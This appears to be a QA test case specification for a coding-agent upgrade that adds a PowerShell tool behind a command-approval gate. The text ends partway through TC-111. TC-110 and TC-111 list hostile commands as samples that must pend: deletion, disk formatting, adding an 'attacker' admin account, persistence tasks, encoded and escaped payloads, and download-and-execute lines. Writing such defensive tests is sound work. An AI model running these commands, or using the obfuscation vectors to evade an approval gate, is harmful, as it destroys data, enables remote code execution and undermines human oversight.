# Software Test Cases (STC)

## SDLC-Agents-4-Enterprise (pi-coding-agent) — SA4E-336: Upgrade pi-coding-agent 0.80.10 → 0.99.1 + native PowerShell tool

---

## Document Information

| Field | Value |
|-------|-------|
| Jira Ticket | SA4E-336 |
| Title | Upgrade pi-coding-agent 0.80.10 → 0.99.1 + native PowerShell tool |
| Author | QA Agent |
| Version | 1.2 |
| Date | 2026-10-01 |
| Status | Draft |
| Related STP | documents/SA4E-336/STP.md (v1.2) |
| Related FSD | documents/SA4E-336/FSD.md (v2.1) |
| Related TDD | documents/SA4E-336/TDD.md (v1.2) |

---

## Revision History

| Version | Date | Author | Changes |
|---------|------|--------|---------|
| 1.0 | 2026-10-01 | QA Agent | Initiate document — auto-generated from FSD use cases, business rules, and TDD test architecture |
| 1.1 | 2026-10-01 | QA Agent | Reconciled to TDD v1.1 per DISCREPANCY.md OPEN-2 — re-scoped mode-less bash assertions (TC-309/TC-606/TC-701/TC-804), mode-scoped fail-secure tests (TC-103/TC-206/TC-207/TC-403/TC-407), TC-310 mechanism aligned to `DESTRUCTIVE_PS_PATTERNS`, added bash regression TC-807/TC-808 (TDD §11.3 TC-15/TC-16), test data CSV re-scoped with `mode` column |
| 1.2 | 2026-10-01 | QA Agent | Re-scoped to TDD v1.2 (allowlist-of-safe posture) + SECURITY-REVIEW.md (SEC-01..SEC-12). **(A) OPEN-2 close:** TC-309 step for bash corrected (bash NOT auto-approve under Supervised); TC-606/TC-701 bash rows corrected ("NOT identical to PS" — PS now allowlist-of-safe, bash keeps pre-upgrade mode-dependent). **(B) SEC-02 allowlist-of-safe:** TC-004 now asserts auto-approve via `READONLY_PS_PATTERNS` positive match (not `READ_ONLY_TOOLS` membership); TC-108 destructive-content gate; TC-103 fail-secure re-scoped. **(C) TC-404 FLIP:** empty command now PENDS (fail-secure), was auto-approve. **(D) New SEC cases:** TC-110 (SEC-01 destructive-category coverage matrix), TC-111 (SEC-03 bypass-resistance matrix), TC-112 (SEC-04 ordering-invariant), TC-113 (SEC-08 malformed/renamed input pends), TC-114 (SEC-09 unwired getMode regression), TC-315 (SEC-02 allowlist-of-safe authority), TC-410 (SEC-01/03 unrecognized/undecodable pends), TC-608 (SEC-05 audit log), TC-609 (SEC-07 dependency supply-chain gate). RTM extended (BR-10/BR-11 + NFR-SEC-01..04 + SEC-01..SEC-10). Total 78 → 88. Related TDD → v1.2. |

---

## Test Case Summary

| Category | ID Range | Count | Priority | Levels Used |
|----------|----------|-------|----------|-------------|
| Functional — Happy Path | TC-001 to TC-010 | 10 | High | UT, IT, E2E-API |
| Functional — Alternative Flows | TC-100 to TC-115 | 15 | High | UT, IT, E2E-API |
| Functional — Exception/Error Flows | TC-200 to TC-207 | 8 | High | UT, IT, E2E-API |
| Business Rule Validation | TC-300 to TC-315 | 16 | High | PBT, UT, IT, E2E-API |
| Boundary & Negative Testing | TC-400 to TC-410 | 11 | Medium | PBT, UT, IT |
| UI/UX Testing | TC-500 to TC-503 | 4 | Medium | E2E-UI, SIT |
| Non-Functional (Performance, Security) | TC-600 to TC-609 | 10 | High | IT, E2E-API |
| Integration Testing | TC-700 to TC-704 | 5 | High | IT |
| Regression Testing | TC-800 to TC-808 | 9 | Medium | UT, IT, E2E-API, E2E-UI, SIT |
| **Total** | — | **88** | — | — |

**Test Level Summary (mirrors STP §2.7):**

| Level | Test Case IDs | Count | Automated |
|-------|--------------|-------|-----------|
| PBT | TC-301, TC-311, TC-312, TC-407, TC-408 | 5 | ✅ fast-check + vitest |
| UT | TC-001, TC-002, TC-005, TC-006, TC-007, TC-008, TC-100, TC-101, TC-102, TC-103, TC-105, TC-106, TC-108, TC-110, TC-111, TC-112, TC-113, TC-114, TC-115, TC-203, TC-206, TC-207, TC-300, TC-303, TC-304, TC-305, TC-306, TC-309, TC-310, TC-313, TC-314, TC-315, TC-400, TC-401, TC-402, TC-403, TC-404, TC-405, TC-406, TC-410, TC-801, TC-802 | 42 | ✅ vitest |
| IT | TC-003, TC-004, TC-204, TC-205, TC-307, TC-409, TC-600, TC-601, TC-604, TC-605, TC-606, TC-607, TC-608, TC-700, TC-701, TC-702, TC-703, TC-704, TC-804, TC-807, TC-808 | 21 | ✅ vitest + real SDK 0.99.1 + pwsh |
| E2E-API | TC-009, TC-010, TC-104, TC-107, TC-200, TC-201, TC-202, TC-302, TC-308, TC-602, TC-603, TC-609, TC-800, TC-806 | 14 | ✅ vitest + exec |
| E2E-UI | TC-500, TC-501, TC-803 | 3 | ✅ webview harness / Playwright |
| SIT | TC-502, TC-503, TC-805 | 3 | ❌ Manual (visual/UX only) |
| **Total** | — | **88** | **85 automated (96.6%) / 3 manual (3.4%)** |

---

## 1. Functional Test Cases — Happy Path

### TC-001: createWorkspaceTools returns PowerShell tool on win32

| Field | Value |
|-------|-------|
| **ID** | TC-001 (UT-01) |
| **Priority** | High |
| **Type** | Functional |
| **Level** | UT — vitest |
| **Requirement** | UC-002, BR-05, Story 2 AC-1; FSD §3.2.2 |
| **Preconditions** | pi-coding-agent 0.99.1 installed; `mockPlatform('win32')` active; workspace root `C:\projects\kiro\SDLC-Agents-4-Enterprise` |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools('C:\\projects\\kiro\\SDLC-Agents-4-Enterprise')` with `process.platform = 'win32'` | Function resolves without throwing |
| 2 | Find tool where `tool.name === 'powershell'` | Exactly one tool named `"powershell"` exists in returned array |
| 3 | Verify core tools present | Array contains `read`, `write`, `edit`, `grep`, `find`, `ls` alongside shell tool |
| 4 | Verify no `bash` tool | No tool with name `"bash"` in returned array on win32 |

**Test Data:** workspaceRoot = `C:\projects\kiro\SDLC-Agents-4-Enterprise`; platform = `win32`
**Postconditions:** Tool array state unchanged; platform mock restored
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-002: createWorkspaceTools returns bash tool on non-win32

| Field | Value |
|-------|-------|
| **ID** | TC-002 (UT-02) |
| **Priority** | High |
| **Type** | Functional |
| **Level** | UT — vitest |
| **Requirement** | UC-002, BR-06, Story 2 AC-2; FSD §3.2.2 AF-3 |
| **Preconditions** | pi-coding-agent 0.99.1 installed; `mockPlatform('linux')` active |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools('/home/user/project')` with `process.platform = 'linux'` | Function resolves without throwing |
| 2 | Find tool where `tool.name === 'bash'` | Exactly one tool named `"bash"` exists (unchanged behavior) |
| 3 | Verify no `powershell` tool | No tool with name `"powershell"` on non-win32 |

**Test Data:** workspaceRoot = `/home/user/project`; platform = `linux`
**Postconditions:** Platform mock restored
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-003: PowerShell tool executes native command with c:\ path

| Field | Value |
|-------|-------|
| **ID** | TC-003 (IT-01) |
| **Priority** | High |
| **Type** | Functional |
| **Level** | IT — vitest + real SDK 0.99.1 + real pwsh |
| **Requirement** | UC-002, Story 2 AC-4; FSD §3.2.2 step 5 |
| **Preconditions** | Real `createPowerShellTool` from 0.99.1; pwsh available; workspace root exists |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Create tools via real `createWorkspaceTools` on win32 | Shell tool named `"powershell"` present |
| 2 | Execute command `Get-ChildItem 'C:\projects\kiro\SDLC-Agents-4-Enterprise' -Name` via the tool | Command executes; returns file listing |
| 3 | Execute command `Test-Path 'c:/projects/kiro/SDLC-Agents-4-Enterprise'` (forward-slash variant) | Returns `True` — no translation attempted, no `/c/` mangling |
| 4 | Verify no path translation errors in output | Output contains no `normalizBashCommandPaths` artifacts (no `/c/projects/...` substitution) |

**Test Data:** command 1 = `Get-ChildItem 'C:\projects\kiro\SDLC-Agents-4-Enterprise' -Name`; command 2 = `Test-Path 'c:/projects/kiro/SDLC-Agents-4-Enterprise'`
**Postconditions:** Workspace unchanged (read-only commands)
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts` (integration section)

---

### TC-004: Read-only PowerShell command auto-approved via READONLY_PS_PATTERNS allowlist

| Field | Value |
|-------|-------|
| **ID** | TC-004 (IT-02) |
| **Priority** | High |
| **Type** | Functional — Security |
| **Level** | IT — vitest + real ToolApprovalGate |
| **Requirement** | UC-003, BR-10, Story 3 AC-1; TDD v1.2 §3.2 Step 1b (allowlist-of-safe, SEC-02); §7.3.3 `READONLY_PS_PATTERNS` |
| **Preconditions** | Real `ToolApprovalGate` + `CommandPatternMatcher` + gate handler wired; `ToolApprovalClassifier` exports `READONLY_PS_PATTERNS` + `normalizePsCommand` (TDD v1.2) |

> **v1.2 re-scope (SEC-02):** `powershell` is NO LONGER in `READ_ONLY_TOOLS`. Auto-approval now requires a POSITIVE allowlist match on `READONLY_PS_PATTERNS` (TDD v1.2 §3.2 Step 1b) after passing the destructive check (Step 1) and being statically understandable (`normalizePsCommand(...).decoded === true`). This TC verifies the allowlist path, not name-set membership.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolUseId: 'tu-ps-ro', toolName: 'powershell', input: { command: 'Get-ChildItem .' } })` | Decision resolves |
| 2 | Check result | `res.approved === true`, reason `Read-only PowerShell command auto-approved` — matched `READONLY_PS_PATTERNS` (`/^get-childitem\b/i`), did NOT match `DESTRUCTIVE_PS_PATTERNS`, `decoded === true` |
| 3 | Verify gate NOT touched | `gate.requestApproval` spy not called — no approval dialog for allowlisted read-only ops |
| 4 | Verify mechanism (NOT name-set) | Auto-approval came from Step 1b `READONLY_PS_PATTERNS` positive match — `powershell` is NOT a member of `READ_ONLY_TOOLS` (TDD v1.2 §3.2); a read-only PS command whose cmdlet is absent from `READONLY_PS_PATTERNS` would PEND (over-pend, see TC-410) |

**Test Data:** toolName = `powershell`; command = `Get-ChildItem .`; toolUseId = `tu-ps-ro`
**Postconditions:** No pending approval entries
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-005: classifyTool maps powershell to shell category

| Field | Value |
|-------|-------|
| **ID** | TC-005 (UT-03) |
| **Priority** | High |
| **Type** | Functional |
| **Level** | UT — vitest |
| **Requirement** | UC-003, BR-12, Story 3 AC-3; FSD §3.3.6 |
| **Preconditions** | `StreamProtocolAdapter` importable with 0.99.1 types |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Instantiate `StreamProtocolAdapter` | Instance created |
| 2 | Call `adapter.classifyTool('powershell')` | Returns `'shell'` |
| 3 | Call `adapter.classifyTool('bash')` | Returns `'shell'` (unchanged) |

**Test Data:** names = `powershell`, `bash`
**Postconditions:** None
**File:** `extension/src/chat/engine/__tests__/StreamProtocolAdapter.test.ts` (or nearest existing adapter test)

---

### TC-006: buildFailureSteerCorrection PowerShell dialect

| Field | Value |
|-------|-------|
| **ID** | TC-006 (UT-04) |
| **Priority** | High |
| **Type** | Functional |
| **Level** | UT — vitest |
| **Requirement** | UC-003, BR-13; FSD §3.3.5; TDD §3.4 |
| **Preconditions** | `turn-budget-guard.ts` importable |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `buildFailureSteerCorrection('powershell', 3)` | Returns PowerShell-dialect guidance |
| 2 | Check message content | Contains `Tool 'powershell' failed 3 times`, `PowerShell: use Get-ChildItem (ls), Get-Content (cat), Test-Path`, `Windows paths work as-is (c:\... or c:/...)` |
| 3 | Verify no bash-only guidance | Does NOT contain `never cmd syntax like dir /b` instruction block aimed at powershell context |

**Test Data:** toolName = `powershell`; repeatCount = `3`
**Postconditions:** None
**File:** `extension/src/pi-workflow/__tests__/turn-budget-guard.test.ts`

---

### TC-007: buildWorkspaceSystemPrompt uses PowerShell dialect on win32

| Field | Value |
|-------|-------|
| **ID** | TC-007 (UT-05) |
| **Priority** | High |
| **Type** | Functional |
| **Level** | UT — vitest |
| **Requirement** | UC-002, BR-08, Story 2 AC-3; FSD §3.4.2; TDD §3.5 |
| **Preconditions** | `mockPlatform('win32')` active; 0.99.1 installed |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `buildWorkspaceSystemPrompt('C:\\projects\\kiro\\SDLC-Agents-4-Enterprise')` with win32 | Prompt built |
| 2 | Check dialect | Contains `The shell tool is Windows PowerShell (pwsh).` |
| 3 | Check cmdlets guidance | Contains `Use PowerShell cmdlets (Get-ChildItem/Get-Content/Test-Path) or their aliases (ls/cat/dir all work).` |
| 4 | Check paths guidance | Contains `Windows paths work as-is (c:\... or c:/...) — no translation needed.` |
| 5 | Verify workspace root normalized | Contains `Workspace root: C:/projects/kiro/SDLC-Agents-4-Enterprise` (forward slashes) |

**Test Data:** workspaceRoot = `C:\projects\kiro\SDLC-Agents-4-Enterprise`; platform = `win32`
**Postconditions:** Platform mock restored
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-008: Session loadout includes powershell and excludes bash on win32

| Field | Value |
|-------|-------|
| **ID** | TC-008 (UT-06) |
| **Priority** | High |
| **Type** | Functional |
| **Level** | UT — vitest |
| **Requirement** | UC-003, BR-14; FSD §3.5.2; TDD §3.6 |
| **Preconditions** | `mockPlatform('win32')` active; 0.99.1 `createAllToolDefinitions` available |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `getSessionToolLoadout(workspaceRoot)` with win32 | Loadout returned |
| 2 | Check powershell present | Tool with name `"powershell"` in loadout |
| 3 | Check bash excluded | No tool with name `"bash"` (single shell tool — avoids model confusion) |

**Test Data:** workspaceRoot = `C:\projects\kiro\SDLC-Agents-4-Enterprise`; platform = `win32`
**Postconditions:** Platform mock restored
**File:** `extension/src/pi-workflow/__tests__/pi-agent-session-host.test.ts`

---

### TC-009: npm ls shows single pi-agent-core version 0.99.1

| Field | Value |
|-------|-------|
| **ID** | TC-009 (E2E-API-01) |
| **Priority** | High |
| **Type** | Functional |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | UC-001, BR-04, Story 1 AC-1, AC-3; FSD §3.1.2 step 5 |
| **Preconditions** | `npm install` completed with 0.99.1 in `extension/package.json` |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run `npm ls @earendil-works/pi-agent-core` in extension/ | Output shows exactly one version: `0.99.1` |
| 2 | Run `npm ls @earendil-works/pi-coding-agent` | Single version `0.99.1` |
| 3 | Parse output for duplicates | `duplicateCount === 0` — no nested/deduped trees |

**Test Data:** packageName = `@earendil-works/pi-agent-core`; expectedVersion = `0.99.1`
**Postconditions:** Dependency tree unchanged
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-010: TypeScript compilation passes with 0 errors

| Field | Value |
|-------|-------|
| **ID** | TC-010 (E2E-API-02) |
| **Priority** | High |
| **Type** | Functional |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | UC-001, Story 1 AC-2; FSD §3.1.2 step 3; NFR Compatibility |
| **Preconditions** | All type fixes applied against 0.99.1 `.d.ts` (no `as any`) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run `npx tsc --noEmit -p extension/tsconfig.json` | Exit code 0 |
| 2 | Parse output | 0 type errors (`PI_TSC_ERROR` not raised) |

**Test Data:** tsconfig = `extension/tsconfig.json`
**Postconditions:** Build state unchanged
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

## 2. Functional Test Cases — Alternative Flows

### TC-100: pwsh.exe not found → Windows PowerShell 5.1 fallback (AF-1 UC-002)

| Field | Value |
|-------|-------|
| **ID** | TC-100 (UT-07) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow |
| **Level** | UT — vitest |
| **Requirement** | UC-002 AF-1, Error Code PI_PWSH_NOT_FOUND; FSD §3.2.2 AF-1; TDD §13.1 |
| **Preconditions** | SDK mocked so `createPowerShellTool` resolves pwsh via fallback chain; `mockPlatform('win32')` active |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools` on win32 with mocked SDK where pwsh.exe resolution fails | SDK falls back to Windows PowerShell 5.1 internally |
| 2 | Check returned tool name | Tool still named `"powershell"` (SDK self-resolves — 0.99.1 behavior) |
| 3 | Check log | Info-level event logged: `PowerShell not found; using Windows PowerShell` / `PI_PWSH_NOT_FOUND` |

**Test Data:** mocked SDK; platform = `win32`
**Postconditions:** Tool usable; no crash
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-101: PowerShell tool creation fails → fallback to bash (AF-2 UC-002)

| Field | Value |
|-------|-------|
| **ID** | TC-101 (UT-08) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow |
| **Level** | UT — vitest |
| **Requirement** | UC-002 AF-2, Error Code PI_PWSH_UNAVAILABLE; FSD §3.2.2 AF-2; TDD §13.1 |
| **Preconditions** | SDK mocked so `createPowerShellTool` throws |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools` on win32 with mocked `createPowerShellTool` that throws | Error caught — function does NOT crash |
| 2 | Check fallback | Tool named `"bash"` returned (fallback with Git-Bash workaround) |
| 3 | Check log | Error-level event logged: `createPowerShellTool failed, falling back to bash` / `PI_PWSH_UNAVAILABLE` |
| 4 | Verify error surfaced | Warning/error surfaced to user per FSD §3.2.5 ("Shell tool unavailable; using Bash fallback") |

**Test Data:** mocked throwing factory; platform = `win32`
**Postconditions:** Shell tool available as bash; no crash
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-102: Non-Windows platform keeps createBashTool unchanged (AF-3 UC-002)

| Field | Value |
|-------|-------|
| **ID** | TC-102 (UT-09) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow |
| **Level** | UT — vitest |
| **Requirement** | UC-002 AF-3, BR-06; FSD §3.2.2 AF-3 |
| **Preconditions** | `mockPlatform('darwin')` active |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `createWorkspaceTools` with `process.platform = 'darwin'` | Resolves without error |
| 2 | Verify shell tool | Tool named `"bash"`; `createBashTool` used as before — no PowerShell wiring on non-win32 |

**Test Data:** platform = `darwin`; workspaceRoot = `/Users/user/project`
**Postconditions:** Platform mock restored
**File:** `extension/src/pi-workflow/__tests__/pi-coding-tools.test.ts`

---

### TC-103: Non-allowlisted PowerShell command → pends (fail-secure deny-by-default) (AF-1 UC-003)

| Field | Value |
|-------|-------|
| **ID** | TC-103 (UT-10) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow — Security |
| **Level** | UT — vitest |
| **Requirement** | UC-003 AF-1; TDD v1.2 §3.2 Step 1c (deny-by-default, SEC-02); NFR-SEC-01/02 (§8.4) |
| **Preconditions** | Gate handler wired per TDD v1.2 (allowlist-of-safe); `getMode()` available for both modes |

> **v1.2 re-scope (SEC-02):** under the allowlist-of-safe posture, a `powershell` command that is understandable and non-destructive but NOT matched by `READONLY_PS_PATTERNS` (e.g., an unusual/unrecognized read cmdlet) PENDS in BOTH modes (fail-secure deny-by-default, §3.2 Step 1c) — it is NOT auto-approved. This replaces the old AF-1 framing ("powershell removed from READ_ONLY_TOOLS → prompt"), because powershell is no longer gated by name-set membership.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolName: 'powershell', input: { command: 'Get-Clipboard' } })` (understandable, non-destructive, NOT in `READONLY_PS_PATTERNS`) under Supervised | `res.approved === false` — PENDS via gate (spy called); reason `Unrecognized PowerShell command requires approval (fail-secure)` |
| 2 | Repeat the same call under Autopilot (`getMode()` → `'autopilot'`) | `res.approved === false` — STILL PENDS; deny-by-default is **mode-independent** for powershell (TDD v1.2 §3.2 Step 1c) — Autopilot does NOT auto-approve a non-allowlisted PS command |
| 3 | Verify no fall-through to read-only / Autopilot path | Gate reached in both modes — the powershell branch returns explicitly and never falls through to Step 2 (`READ_ONLY_TOOLS`) or Step 4 (Autopilot auto-approve) — SEC-04 invariant |

**Test Data:** toolName = `powershell`; command = `Get-Clipboard`; modes = `supervised`, `autopilot`
**Postconditions:** No security bypass — non-allowlisted PS always pends (over-pend is the accepted residual, NFR-SEC-02)
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-104: Duplicate pi-agent-core → npm dedupe → single version (AF-1 UC-001)

| Field | Value |
|-------|-------|
| **ID** | TC-104 (E2E-API-03) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | UC-001 AF-1, BR-04, Error Code PI_DUPLICATE_DEP; FSD §3.1.2 AF-1 |
| **Preconditions** | Simulated duplicate state or `npm ls` showing multiple versions |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Run `npm ls @earendil-works/pi-agent-core` — confirm duplicate state (or fixture) | Multiple versions detected |
| 2 | Run `npm dedupe` (or add `overrides` in root package.json) then `npm install` | Install completes |
| 3 | Re-run `npm ls @earendil-works/pi-agent-core` | Exactly one version `0.99.1` |

**Test Data:** packageName = `@earendil-works/pi-agent-core`; expected = single `0.99.1`
**Postconditions:** Single resolved version
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-105: TSC missing type definition fixed without `as any` (AF-2 UC-001)

| Field | Value |
|-------|-------|
| **ID** | TC-105 (UT-11) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow |
| **Level** | UT — vitest (static scan) |
| **Requirement** | UC-001 AF-2, BR-02; FSD §3.1.2 AF-2 |
| **Preconditions** | Type fixes applied to `pi-provider.ts`, `pi-event-mapper.ts`, `pi-agent-session-host.ts` |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Scan all changed files under `extension/src/pi-workflow/` and `extension/src/chat/engine/` for ` as any` | Zero occurrences |
| 2 | Verify call sites updated against 0.99.1 `.d.ts` (compile passes — see TC-010) | Type-safe fixes, no suppression shortcuts |

**Test Data:** file set = `extension/src/pi-workflow/**/*.ts`, `extension/src/chat/engine/*.ts`
**Postconditions:** Codebase clean of `as any`
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts` (scan section)

---

### TC-106: classifyTool unknown tool → default "shell" + warning (AF-3 UC-003)

| Field | Value |
|-------|-------|
| **ID** | TC-106 (UT-12) |
| **Priority** | Medium |
| **Type** | Functional — Alternative Flow |
| **Level** | UT — vitest |
| **Requirement** | UC-003 AF-3, Error Code (internal); FSD §3.3.2 AF-3, §9.1 |
| **Preconditions** | `StreamProtocolAdapter` instantiated |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `adapter.classifyTool('totally-unknown-tool')` | Returns `'shell'` (default category) — no crash |
| 2 | Check log | Warning logged: `classify_tool_unknown` with tool name (FSD §9.2) |

**Test Data:** name = `totally-unknown-tool`
**Postconditions:** None
**File:** `extension/src/chat/engine/__tests__/StreamProtocolAdapter.test.ts`

---

### TC-107: Node engine compatibility verified before bump (AF-3 UC-001)

| Field | Value |
|-------|-------|
| **ID** | TC-107 (E2E-API-04) |
| **Priority** | Medium |
| **Type** | Functional — Alternative Flow |
| **Level** | E2E-API — vitest + exec |
| **Requirement** | UC-001 AF-3, BR-03; FSD §3.1.2 AF-3; NFR Compatibility |
| **Preconditions** | 0.99.1 package metadata accessible (installed or registry) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Read `engines.node` from installed `@earendil-works/pi-coding-agent/package.json` | Requirement present (or absent = no constraint) |
| 2 | Compare with current Node version (`node --version` → 22.x) | Compatible — 22.x satisfies `engines.node` (resolved: no Node bump needed, TDD §15.2 Q1) |
| 3 | If incompatible (Node < required) | Escalation path documented — Node bump out of scope (AF-3) |

**Test Data:** current Node = `22.x`; engines.node from 0.99.1 package.json
**Postconditions:** Compatibility confirmed
**File:** `extension/tests/e2e/dependency-upgrade.e2e.test.ts`

---

### TC-108: Destructive PowerShell command never auto-approved (AF-2 UC-003)

| Field | Value |
|-------|-------|
| **ID** | TC-108 (UT-13) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow — Security |
| **Level** | UT — vitest |
| **Requirement** | UC-003 AF-2, BR-11, Story 3 AC-2; TDD v1.2 §3.2 Step 1, §7.3.2 `DESTRUCTIVE_PS_PATTERNS` |
| **Preconditions** | Gate handler wired per TDD v1.2; `ToolApprovalClassifier` exports `DESTRUCTIVE_PS_PATTERNS` (command-content regex, checked against normalized command) |

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | Call `handler.requestApproval({ toolName: 'powershell', input: { command: 'Remove-Item -Recurse C:\\temp' } })` | `res.approved === false` (pend) — normalized command matches `DESTRUCTIVE_PS_PATTERNS` `/\bremove-item\b/i` at Step 1 |
| 2 | Call with `{ command: 'Stop-Process -Name node' }` | `res.approved === false` (pend) — matches `/\bstop-process\b/i` |
| 3 | Verify content gate wins over any safe path | Destructive check (Step 1) runs FIRST and is mode-independent — a destructive command NEVER reaches the Step 1b `READONLY_PS_PATTERNS` auto-approve, regardless of mode (TDD v1.2 §3.2; cross-check TC-112 ordering invariant) |

**Test Data:** commands = `Remove-Item -Recurse C:\temp`, `Stop-Process -Name node`
**Postconditions:** No security bypass
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-110: SEC-01 — Destructive-pattern coverage matrix (every category pends)

| Field | Value |
|-------|-------|
| **ID** | TC-110 (UT-35) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow — Security |
| **Level** | UT — vitest (data-driven over `testdata/destructive-catalog-testdata.csv`) |
| **Requirement** | SEC-01 (High) design requirement; BR-11; TDD v1.2 §7.3.2 destructive catalog |
| **Preconditions** | Gate handler wired per TDD v1.2; `DESTRUCTIVE_PS_PATTERNS` implements the full §7.3.2 catalog |

> **SEC-01 coverage matrix:** every destructive category in TDD §7.3.2 MUST have at least one sample that pends. Data-driven from `destructive-catalog-testdata.csv`.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | **File delete** — for each of `Remove-Item -Recurse .`, `rm -rf x`, `del x.txt`, `rd /s /q x`, `rmdir x`, `erase x`, `Clear-Content x`, `Remove-ItemProperty HKLM:\x` | ALL pend (`approved: false`), mode-independent |
| 2 | **File overwrite** — `Set-Content a.txt y`, `Out-File a.txt`, `New-Item a -Force`, `echo x > a.txt`, `echo x >> a.txt`, `Copy-Item a b -Force`, `Move-Item a b`, `Rename-Item a b` | ALL pend |
| 3 | **Process/service** — `Stop-Process -Name node`, `kill 123`, `taskkill /F /PID 1`, `Stop-Service svc`, `Set-Service svc -Status Stopped`, `Restart-Service svc`, `Restart-Computer`, `shutdown /r` | ALL pend |
| 4 | **Format/disk** — `Format-Volume -DriveLetter D`, `Clear-Disk -Number 1`, `Initialize-Disk 1`, `diskpart` | ALL pend |
| 5 | **Policy/security** — `Set-ExecutionPolicy Bypass`, `reg delete HKLM\x /f`, `reg add HKLM\x`, `Set-Acl p a`, `Set-ItemProperty HKLM:\x n v` | ALL pend |
| 6 | **Accounts** — `net user attacker P@ss /add`, `net localgroup administrators attacker /add`, `New-LocalUser x`, `Remove-LocalUser x`, `Add-LocalGroupMember -Group Administrators -Member x` | ALL pend |
| 7 | **Scheduled/persistence** — `schtasks /create /tn t /tr c.exe`, `Register-ScheduledTask -TaskName t`, `New-Service -Name s -BinaryPathName c.exe` | ALL pend |
| 8 | **Git-destructive** — `git reset --hard HEAD~1`, `git clean -fdx`, `git checkout -- .`, `git push origin main`, `git commit -m x` | ALL pend |

**Test Data:** `testdata/destructive-catalog-testdata.csv` (one row per sample, column `category`)
**Postconditions:** Every §7.3.2 category represented; 0 auto-approvals
**File:** `extension/src/pi-workflow/__tests__/pi-workflow-gate.test.ts`

---

### TC-111: SEC-03 — Bypass-resistance matrix (every obfuscation vector pends)

| Field | Value |
|-------|-------|
| **ID** | TC-111 (UT-36) |
| **Priority** | High |
| **Type** | Functional — Alternative Flow — Security |
| **Level** | UT — vitest (data-driven over `testdata/bypass-vectors-testdata.csv`) |
| **Requirement** | SEC-03 (High); TDD v1.2 §7.3.1 normalization; §3.2 (`decoded === false → pend`) |
| **Preconditions** | `normalizePsCommand` implemented per §7.3.1 (decode `-EncodedCommand`/`-enc`/`-e`, strip backtick/caret, collapse ws, lower-case; `decoded=false` when undecodable); gate wired per v1.2 |

> **SEC-03 bypass matrix:** each vector must PEND — either because normalization reveals a destructive verb, or because the command cannot be statically understood (`decoded === false` → fail-secure pend). None may auto-approve.

**Test Steps:**

| Step | Action | Expected Result |
|------|--------|-----------------|
| 1 | `powershell -EncodedCommand <base64 of Remove-Item -Recurse .>` | Pends — decoded payload matches destructive; `matchedPattern` = destructive category |
| 2 | `pwsh -e <base64>` and `pwsh -ec <base64>` short forms | Pend — same decode path |
| 3 | `iex 'Remove-Item -R .'` and `Invoke-Expression $cmd` | Pend — `/\biex\b/`, `/\binvoke-expression\b/` (dynamic eval → `decoded=false`) |
| 4 | Call operator + concat: `& ('Remov'+'e-Item') .` and `&{ rm -r . }` | Pend — call-operator pattern `/&\s*[('"]/`; concat resolved or `decoded=false` |
| 5 | Backtick/caret escape: `` Remo`ve-Item . `` and `Remo^ve-Item .` | Pend — escapes stripped by normalization → `remove-item` matches |
| 6 | `cmd /c del /s /q .` (cmd shell-out) | Pend — `/\bcmd\b/` and `/\bdel\b/` |
| 7 | Download+exec (RCE): `iwr http://x -o y; iex y`, `irm http://x | iex`, `curl http://x | iex` | Pend — `/\biwr\b/`, `/\birm\b/`, `/\bcurl\b/`, `/\biex\b/` |
